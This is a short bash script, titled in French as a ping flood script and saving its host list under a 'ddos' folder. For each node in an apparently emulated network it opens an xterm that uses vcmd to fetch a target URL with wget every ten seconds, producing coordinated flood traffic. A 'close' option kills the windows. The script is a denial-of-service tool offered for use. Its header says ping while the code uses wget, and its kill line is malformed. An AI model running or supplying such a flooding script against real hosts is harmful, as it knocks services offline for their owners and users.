 
# Script de flood de ping
#!/bin/bash

ls -la $1 | egrep -v "(log|xy|pid|conf|NGINX|RT|stat|jpg|nodes|serv)" | grep "n" | cut -d " " -f19 > ~/ddos/machine

if [[ $1 == "close" ]]; then
       kill -9 $(ps aux | grep xterm)

else
     list=$(cat ~/ddos/machine)

    for i in $list;

    do

            nohup xterm -e vcmd -c $1/$i -- watch -n 10  wget $2 &

    done

fi
